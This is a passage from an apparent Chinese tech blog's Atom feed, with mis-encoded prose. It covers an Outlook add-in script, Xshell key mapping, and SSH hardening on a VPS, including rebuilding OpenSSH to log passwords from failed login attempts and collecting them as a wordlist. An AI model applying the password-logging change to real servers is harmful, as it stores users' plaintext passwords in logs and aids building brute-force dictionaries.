class="keyword">try</span>:</span><br><span class="line">        _winreg.DeleteKey(_winreg.HKEY_CURRENT_USER, <span class="string">&quot;Software\\Microsoft\\Office\\Outlook\\Addins\\&quot;</span> + klass._reg_progid_)</span><br><span class="line">    <span class="keyword">except</span> WindowsError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> win32com.server.register</span><br><span class="line">    win32com.server.register.UseCommandLine(OutlookAddin)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;--unregister&quot;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        UnregisterAddin(OutlookAddin)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        RegisterAddin(OutlookAddin)</span><br></pre></td></tr></table></figure><p>å¦ï¼Œoutlookspyå¯¹æŸ¥çœ‹comå¯¹è±¡å¾ˆæœ‰å¸®åŠ©ã€‚</p><p>è®¸ä¹…ä¸ç”¨mdç”Ÿç–äº†   O_o</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å¤©å¤©æ”¶å‡ ç™¾å°å‘Šè­¦é‚®ä»¶ç®€ç›´ä¸èƒ½å¿ï¼Œåˆšå¥½æœ€è¿‘å­¦pyï¼Œç”¨pyå†™äº†ä¸ªoutlookæ’ä»¶ç»ƒç»ƒæ‰‹ã€‚&lt;br&gt;32ä½outlookï¼Œ32ä½python2.7ï¼Œ32ä½pywin32åº“ï¼Œä»¥pywin32å…³äºoutlookçš„ä¸€ä¸ªæ’ä»¶demoä½œåŸºç¡€æ”¹äº†æ”¹ï¼Œå®åœ¨ä¸ä¼švbaã€‚ã€‚ã€‚&lt;br&gt;å»é™¤äº†è„šæœ¬é‡Œçš„æ•æ„Ÿå†…å®¹ï¼Œé¡ºå¸¦æ³¨é‡Šå›½é™…åŒ–äº†ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="python" scheme="https://badb100d.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>xshellè®¾ç½®ctrl+ â†‘ â†“</title>
    <link href="https://badb100d.com/2015/04/08/2015-04-08/"/>
    <id>https://badb100d.com/2015/04/08/2015-04-08/</id>
    <published>2015-04-08T15:32:00.000Z</published>
    <updated>2015-04-08T15:32:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>ç”±screenè½¬tmuxï¼Œä½¿ç”¨çš„æ—¶å€™å‘ç°tmuxçš„paneå¤§å°åªèƒ½å·¦å³è°ƒèŠ‚ä¸èƒ½ä¸Šä¸‹è°ƒèŠ‚ï¼Œå„ç§æœç´¢åå‘ç°æ˜¯xshellçš„é—®é¢˜ï¼Œ<strong>xshell</strong>è¿™ä¸ªå‘ç«Ÿç„¶ä¸å“åº”ctrl+upå’Œctrl+downã€‚ã€‚ã€‚<br>åœ¨centosä¸‹terminalé‡Œcatï¼Œç„¶åè¾“å…¥ctrl+up å›è½¦ å’Œ ctrl+down å›è½¦ï¼Œåˆ†åˆ«å¾—åˆ°â€\x1B[1;5Aâ€å’Œâ€\x1B[1;5Bâ€ï¼Œå…¶ä¸­\x1Bä»£æŒ‡æ§åˆ¶ç¬¦ESCï¼Œå¯ä»¥é€šè¿‡Alt+27æŒ‰å‡ºæ¥ã€‚å¤åˆ¶è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œxshellå·¥å…·-&gt;é€‰é¡¹-&gt;é”®ç›˜å’Œé¼ æ ‡-&gt;ç¼–è¾‘-&gt;æ–°å»ºï¼ŒåŠ å…¥ctrl+upï¼Œç±»å‹é€‰æ‹©å‘é€å­—ç¬¦ä¸²ï¼Œç²˜è´´åˆšæ‰å¤åˆ¶çš„å¯¹åº”å­—ç¬¦ä¸²ï¼Œå®Œæˆã€‚</p><p>æŠ½ç©ºä¹°ä¸ªmbpå§ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ç”±screenè½¬tmuxï¼Œä½¿ç”¨çš„æ—¶å€™å‘ç°tmuxçš„paneå¤§å°åªèƒ½å·¦å³è°ƒèŠ‚ä¸èƒ½ä¸Šä¸‹è°ƒèŠ‚ï¼Œå„ç§æœç´¢åå‘ç°æ˜¯xshellçš„é—®é¢˜ï¼Œ&lt;strong&gt;xshell&lt;/strong&gt;è¿™ä¸ªå‘ç«Ÿç„¶ä¸å“åº”ctrl+upå’Œctrl+downã€‚ã€‚ã€‚&lt;br&gt;åœ¨centosä¸‹terminalé‡Œcatï¼Œç„¶åè¾“å…¥ctrl+up å›è½¦ å’Œ ctrl+down å›è½¦ï¼Œåˆ†åˆ«å¾—åˆ°â€\x1B[1;5Aâ€å’Œâ€\x1B[1;5Bâ€ï¼Œå…¶ä¸­\x1Bä»£æŒ‡æ§åˆ¶ç¬¦ESCï¼Œå¯ä»¥é€šè¿‡Alt+27æŒ‰å‡ºæ¥ã€‚å¤åˆ¶è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œxshellå·¥å…·-&amp;gt;é€‰é¡¹-&amp;gt;é”®ç›˜å’Œé¼ æ ‡-&amp;gt;ç¼–è¾‘-&amp;gt;æ–°å»ºï¼ŒåŠ å…¥ctrl+upï¼Œç±»å‹é€‰æ‹©å‘é€å­—ç¬¦ä¸²ï¼Œç²˜è´´åˆšæ‰å¤åˆ¶çš„å¯¹åº”å­—ç¬¦ä¸²ï¼Œå®Œæˆã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="tools" scheme="https://badb100d.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>ç»™VPSåŠ sshçˆ†ç ´è®°å½•</title>
    <link href="https://badb100d.com/2015/03/30/2015-03-30/"/>
    <id>https://badb100d.com/2015/03/30/2015-03-30/</id>
    <published>2015-03-30T14:31:00.000Z</published>
    <updated>2015-03-30T14:31:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ·»åŠ sshå¯†é’¥éªŒè¯"><a href="#æ·»åŠ sshå¯†é’¥éªŒè¯" class="headerlink" title="æ·»åŠ sshå¯†é’¥éªŒè¯"></a>æ·»åŠ sshå¯†é’¥éªŒè¯</h1><p>æœ€è¿‘å‘ç°ä¸ªäººVPSçš„sshæ—¥å¿—ä¸­æ€»æ˜¯æœ‰å¾ˆå¤šä¸æ˜IPçš„è¿æ¥è¯·æ±‚ï¼Œå¤©å¤©çˆ†ç ´sshä¹Ÿæ˜¯å¤Ÿå‹¤å¥‹çš„ã€‚<br>ä¸ºäº†é˜²æ­¢æŸå¤©VPSçœŸè¢«çˆ†äº†å…ˆç»™sshåŠ ä¸ªå¯†é’¥è®¤è¯ï¼Œé¦–å…ˆæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><img src="/2015/03/30/2015-03-30/ssh-keygen.jpg" class=""><p>å°†ç”Ÿæˆå¥½çš„å¯†é’¥å¯¹å¦¥å–„ä¿å­˜(åœ¨ç”Ÿæˆä¸­å¯é€‰å°†ç§é’¥ç”¨å£ä»¤åŠ å¯†)ã€‚<br>å°†å…¬é’¥(id_rsa.pub)ä¸Šä¼ åˆ°VPSä¸Šï¼Œå¹¶å°†å…¶å†…å®¹æ·»åŠ åˆ°å¯¹åº”ç™»å½•è´¦æˆ·çš„~/.ssh/authorized_keysæ–‡ä»¶ä¸­ï¼Œæ³¨æ„.sshç›®å½•çš„æƒé™æœ€å¥½æ˜¯700(æˆ‘çš„æ˜¯755å¥½åƒä¹Ÿè¡Œ)ï¼Œauthorized_keysçš„æƒé™å¿…é¡»æ˜¯600æˆ–644ã€‚è¿™é‡Œæƒé™é—®é¢˜å‘æ¯”è¾ƒå¤šï¼Œå±ä¸»è²Œä¼¼æ²¡å¤šå¤§é—®é¢˜(æˆ‘çš„ç™»å½•è´¦æˆ·ä¸æ˜¯rootï¼Œä½†æ–‡ä»¶å’Œç›®å½•çš„å±ä¸»éƒ½æ˜¯root)ã€‚<br>ä¿®æ”¹/etc/ssh/sshd_configæ–‡ä»¶ï¼Œåˆ†åˆ«ä¿®æ”¹å¦‚ä¸‹ä¸‰é¡¹:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">PasswordAuthentication no</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬ä¸ç”¨rootç™»çš„è¯ä¹Ÿè®¾ç½®ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br></pre></td></tr></table></figure><p>é‡å¯sshdæœåŠ¡<br>æœ¬åœ°ç”¨Xshellæ·»åŠ åˆšæ‰ç”Ÿæˆçš„ç§é’¥å°±å¯ä»¥è¿æ¥VPSäº†(å¦‚æœè®¾ç½®äº†åŠ å¯†å£ä»¤åˆ™éœ€è¦è¾“å…¥å£ä»¤è§£å¯†ç§é’¥)ã€‚<br>æ­¤æ—¶æœ€åŸºæœ¬çš„è®¾ç½®å¯†é’¥ç™»å½•å°±å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ä¿®æ”¹open-sshçš„ä»£ç æ¥å®ç°è¾“å‡ºéªŒè¯é”™è¯¯æ—¶çš„å¯†ç ã€‚</p><h1 id="ä¿®æ”¹sshæºç "><a href="#ä¿®æ”¹sshæºç " class="headerlink" title="ä¿®æ”¹sshæºç "></a>ä¿®æ”¹sshæºç </h1><p>é¦–å…ˆåˆ‡æ¢åˆ°ä¸€ä¸ªä¸´æ—¶ç›®å½•æ‰§è¡Œapt-get source sshï¼Œæ‰§è¡Œå®Œåç›´æ¥æœ‰ä¸€ä¸ªopenssh-6.6p1/ ç›®å½•å’Œå‡ ä¸ªå‹ç¼©åŒ…(æˆ‘çš„VPSè£…çš„æ˜¯DigitalOceanå®˜æ–¹æä¾›çš„Ubuntué•œåƒ)ï¼Œè¿›å…¥æºç ç›®å½•åé¦–å…ˆå†™ä¸ªpatch:</p><img src="/2015/03/30/2015-03-30/patch-shot.jpg" class=""><p>ç”¨sshå·¥ç¨‹å†…çš„logitæ¥å†™SYSLOGã€‚å†™å®Œpatchåå…ˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patch --dry-run &lt;sshlog.patch</span><br></pre></td></tr></table></figure><p>çœ‹æ˜¯å¦æœ‰é”™è¯¯ï¼Œæ²¡æœ‰é”™è¯¯çš„è¯å°±å¯ä»¥ç›´æ¥patchäº†ã€‚<br>åˆ°è¿™é‡Œå»ºè®®å…ˆå¤‡ä»½ä¸€ä¸‹/etc/sshæ–‡ä»¶å¤¹ï¼Œå†å»ºä¸ªVPSçš„å¿«ç…§ä»¥é˜²æ‚²å‰§ã€‚ã€‚ã€‚<br>åœ¨æºç ç›®å½•æ‰§è¡Œé…ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check --with-md5-passwords --mandir=/usr/share/man</span><br></pre></td></tr></table></figure><p>å¦‚æœå‡ºé”™å°±å®‰è£…ç¼ºå°‘çš„è½¯ä»¶åŒ…ï¼Œä¸‹é¢æ˜¯æˆ‘å®‰è£…æ—¶ç¼ºå°‘çš„è½¯ä»¶åŒ…:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install zlib1g zlib1g.dev openssl libssl-dev</span><br></pre></td></tr></table></figure><p>(ä»¥ä¸Šæ˜¯ubuntuéä¸»æµå‘½åçš„åŒ…åã€‚ã€‚)<br>å…¶ä¸­å®‰libssl-devçš„æ—¶å€™åŠ äº†ä¸ª â€“fix-missingå‚æ•°æ‰æ²¡æœ‰å‡ºé”™ã€‚<br>configureé¡ºåˆ©å®Œæˆåæ‰§è¡Œmakeå’Œmake installï¼Œä¹‹åé‡å¯sshdæœåŠ¡(digitaloceançš„ubuntuä¸‹ç›´æ¥é‡å¯ssh)ã€‚<br>é‡å¯åå…ˆåˆ«æ€¥ç€é€€å‡ºï¼Œåœ¨å½“å‰ä¼šè¯ä¸‹å¯¹æ¯”å¤‡ä»½çš„sshé…ç½®å’Œæ–°ç”Ÿæˆçš„sshé…ç½®çš„ä¸åŒï¼Œæ ¹æ®éœ€è¦æ›´æ”¹ä¸€ä¸‹(è¿™é‡Œæœ€å¥½ä¸è¦æ”¹æ–°ç”Ÿæˆçš„å¯†é’¥ï¼Œæ”¹äº†ä»¥åå¯èƒ½å°±è¦æ¢å¤å¿«ç…§äº†ã€‚ã€‚ã€‚)ï¼Œç„¶åæ–°å¼€å‡ ä¸ªä¼šè¯çœ‹æ˜¯å¦èƒ½æˆåŠŸè¿ä¸ŠVPSã€‚</p><h1 id="æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥"><a href="#æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥" class="headerlink" title="æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥"></a>æ›´æ”¹è´¦æˆ·è®¤è¯ç­–ç•¥</h1><p>ä»¥ä¸Šå®Œæˆåè¿˜è¦å†ä¿®æ”¹ä¸€äº›é…ç½®ï¼Œå…ˆåœ¨shadowé‡ŒæŠŠrootç¦äº†(å¯†ç å‰åŠ ä¸ª!å·)ï¼Œä¹‹åé‡æ–°ä¿®æ”¹sshd_configé…ç½®ï¼Œä¸»è¦æ³¨æ„ä»¥ä¸‹å‡ ä¸ªï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PermitRootLogin no</span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile   %h/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸‹é¢è¿™è¡Œå®é™…ä¸Šæ˜¯é’ˆå¯¹æ‰€æœ‰å…¶ä»–è´¦æˆ·çš„ï¼Œ<br>æˆ‘çš„VPSä¸Šå°±2ä¸ªè´¦æˆ·ï¼Œä¸€ä¸ªrootä¸å…è®¸ç™»å½•å¹¶ä¸”æŠŠshadowåºŸäº†ï¼Œ<br>å¦ä¸€ä¸ªå¸¸ç”¨è´¦æˆ·åœ¨sudoersé‡Œï¼Œsudoersç»„ç™»å½•ç­–ç•¥å¦è¡Œé…ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶çš„æœ€å(è²Œä¼¼Matchæœ‰è¦æ±‚)æ·»åŠ å¦‚ä¸‹å†…å®¹: </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Match Group sudo    #è¿™é‡Œå¯èƒ½ç»„åä¼šä¸ä¸€æ ·ï¼Œwheelã€sudoerä»€ä¹ˆçš„è§†æƒ…å†µè€Œå®š</span><br><span class="line">PasswordAuthentication no  #ç¦æ­¢sudoerså¯†ç ç™»å½•</span><br></pre></td></tr></table></figure><p>ç»è¿‡å¦‚ä¸Šé…ç½®ååªè¦ç”¨æˆ·ååœ¨sudoeré‡ŒVPSæ˜¯ä¸å…è®¸å¯†ç ç™»å½•çš„ã€‚<br>æ­¤æ—¶å¦‚æœæ°å·§æœ‰äººåœ¨çˆ†ç ´ä½ çš„VPSä½ å¯ä»¥é€šè¿‡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -F /var/log/auth.log | grep sshlog</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°ï¼Œæœ‰äº›ä¸»æœºçš„æ—¥å¿—å¯èƒ½åœ¨/var/log/secureå†…ï¼Œå…·ä½“æƒ…å†µå‚ç…§syslog.confæˆ–rsyslog.confçš„é…ç½®ã€‚</p><img src="/2015/03/30/2015-03-30/brute-log.jpg" class=""><p>æ„Ÿå—åˆ°äº†ä¸–ç•Œæ·±æ·±çš„æ¶æ„ã€‚ã€‚ã€‚</p><p>å¯ä»¥å†™ä¸ªè„šæœ¬æˆ–ç¨‹åºæ¥å®šæœŸæå–è¿™äº›å¯†ç è®°å½•ï¼Œé€ä¸Šé—¨çš„å­—å…¸ä¸è¦ç™½ä¸è¦ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;æ·»åŠ sshå¯†é’¥éªŒè¯&quot;&gt;&lt;a href=&quot;#æ·»åŠ sshå¯†é’¥éªŒè¯&quot; class=&quot;headerlink&quot; title=&quot;æ·»åŠ sshå¯†é’¥éªŒè¯&quot;&gt;&lt;/a&gt;æ·»åŠ sshå¯†é’¥éªŒè¯&lt;/h1&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="vps" scheme="https://badb100d.com/tags/vps/"/>
    
  </entry>
  
</feed>
